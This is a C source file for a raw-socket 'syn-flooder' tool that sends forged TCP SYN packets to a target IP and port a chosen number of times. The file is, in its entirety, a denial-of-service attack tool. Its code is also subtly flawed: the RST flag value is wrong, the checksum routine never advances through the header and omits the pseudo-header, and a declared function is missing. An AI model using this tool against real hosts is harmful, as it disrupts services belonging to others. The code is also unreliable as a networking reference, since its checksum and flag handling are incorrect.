#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h> // for socket functions
#include <netinet/in.h> // internet address structs & consts
#include <netinet/ip.h> // IP header structure

#include <errno.h> // error handling

struct tcp_hdr {
  unsigned short tcp_src_port;
  unsigned short tcp_dest_port;
  unsigned int tcp_seq;
  unsigned int tcp_ack;
  unsigned char reserved:4;   // 4 bits from the 6 bits of reserved space
  unsigned char tcp_offset:4; // TCP data offset for little endian host
  unsigned char tcp_flags;    // TCP flags (and 2 bits from reserved space)
#define TCP_FIN  0x01
#define TCP_SYN  0x02
#define TCP_RST  0x03
#define TCP_PUSH 0x08
#define TCP_ACK  0x10
#define TCP_URG  0x20  
  unsigned short tcp_window;
  unsigned short tcp_checksum;
  unsigned short tcp_urgent;
};

void decode_ip(const u_char *);
u_int decode_tcp(const u_char *);
void build_tcp_syn(char *buffer, int port);
short compute_tcp_checksum(char *buffer);
void send_tcp_syn(int socket, struct sockaddr_in *target_address, int target_port);

int main(int argc, char *argv[]) {
  int raw_socket; // raw IP socket
  int i, target_port, yes = 1;
  struct sockaddr_in *address;
  int times = 1;
  
  if (argc < 3) {
    printf("Usage:\n");
    printf("./syn-flooder <target-ip> <target-port> [number-times]\n");
    exit(1);
  }

  if ((address = (struct sockaddr_in *) malloc(sizeof(struct sockaddr_in))) == NULL) {
    printf("Error on malloc\n");
    exit(1);
  }

  if (argc == 4) times = atoi(argv[3]);

  if ((raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    printf("Error creating socket: %s\n", strerror(errno));
    exit(1);
  }

  target_port = atoi(argv[2]);
    
  address->sin_family = AF_INET;
  address->sin_port = 0;
  inet_aton(argv[1], &(address->sin_addr));

  for (i = 0; i < times; i++) {
    send_tcp_syn(raw_socket, address, target_port);    
  }
}

void send_tcp_syn(int socket, struct sockaddr_in *target_address, int target_port) {
  char packet[100];
  unsigned char *ip_addr_part;
  int i;
  
  build_tcp_syn(packet, target_port);
  // decode_tcp(packet);
  
  if ((sendto(socket, packet, sizeof(struct tcp_hdr), 0, (struct sockaddr *)target_address, sizeof(struct sockaddr_in))) == -1) {
    printf("Error sending data: %s\n", strerror(errno));
    exit(1);
  }

  printf("Sending TCP SYN to IP ");
  ip_addr_part = (unsigned char *)(&(target_address->sin_addr).s_addr);
  for(i = 0; i < 4; i++) {
    if (i > 0) {
      printf(".");
    }    
    printf("%hhu", *ip_addr_part);
    ip_addr_part++;
  }
  printf("\n");
  
}

void build_tcp_syn(char *buffer, int port) {
  struct tcp_hdr *header = (struct tcp_hdr *) buffer;

  // note that random() returns a sequence of pseudo-random numbers
  // if not seeded before with srandom(seed), that sequence will repeat
  // for every execution.
  header->tcp_src_port = htons(random());
  header->tcp_dest_port = htons(port);
  header->tcp_seq = htonl(1);
  header->tcp_ack = 0;
  header->reserved = 0;
  header->tcp_offset = 5;
  header->tcp_flags = TCP_SYN;
  header->tcp_window = htons(100);
  header->tcp_checksum = 0;
  header->tcp_urgent = 0;

  header->tcp_checksum = compute_tcp_checksum(buffer);
}

short compute_tcp_checksum(char *buffer) {
  struct tcp_hdr *header = (struct tcp_hdr *) buffer;
  int i;
  unsigned short checksum = 0;
  unsigned short *short_ptr = (unsigned short *)buffer;
  unsigned short short_holder = 0;

  // itero por los 10 conjuntos de 16 bits que conforman el
  // header TCP para calcular el checksum
  for (i = 0; i < 10; i++) {
    short_holder = htons(*buffer);
    checksum += short_holder;
  }

  return checksum;
}

u_int decode_tcp(const u_char *header_start) {
  u_int header_size;
  const struct tcp_hdr *tcp_header;

  tcp_header = (const struct tcp_hdr *)header_start;
  header_size = 4 * tcp_header->tcp_offset;

  printf("\t\t{{ Layer 4 :::: TCP Header }}\n");
  printf("\t\t{ Src Port: %hu\t", ntohs(tcp_header->tcp_src_port));
  printf("Dest Port: %hu }\n", ntohs(tcp_header->tcp_dest_port));
  printf("\t\t{ Seq #: %u\t", ntohl(tcp_header->tcp_seq));
  printf("Ack #: %u }\n", ntohl(tcp_header->tcp_ack));
  printf("\t\t{ Header Size: %u\tFlags: ", header_size);

  if (tcp_header->tcp_flags & TCP_FIN)
    printf("FIN ");
  if (tcp_header->tcp_flags & TCP_SYN)
    printf("SYN ");
  if (tcp_header->tcp_flags & TCP_RST)
    printf("RST ");
  if (tcp_header->tcp_flags & TCP_PUSH)
    printf("PUSH ");
  if (tcp_header->tcp_flags & TCP_ACK)
    printf("ACK ");
  if (tcp_header->tcp_flags & TCP_URG)
    printf("URG ");
  printf(" }\n");

  return header_size;
}
